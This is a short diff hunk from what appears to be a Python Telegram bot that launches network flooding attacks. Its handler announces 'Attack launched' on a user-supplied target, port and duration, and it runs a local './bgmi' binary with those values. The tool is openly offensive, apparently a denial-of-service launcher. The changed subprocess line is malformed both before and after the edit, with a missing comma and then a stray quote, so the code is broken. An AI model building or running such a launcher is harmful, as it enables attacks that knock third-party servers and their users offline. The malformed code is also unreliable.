@@ -80,7 +80,7 @@ def handle_attack(message):
     bot.reply_to(message, f"🚀 Attack launched on {target}:{port} for {duration} seconds.")
 
 async def execute_attack(target, port, duration):
-    proc = await asyncio.create_subprocess_exec("./bgmi", target, str(port), str(duration), 256 "1000")
+    proc = await asyncio.create_subprocess_exec("./bgmi", target, str(port), str(duration), 256 1000")
     await proc.communicate()
 
 @bot.message_handler(commands=['add'])
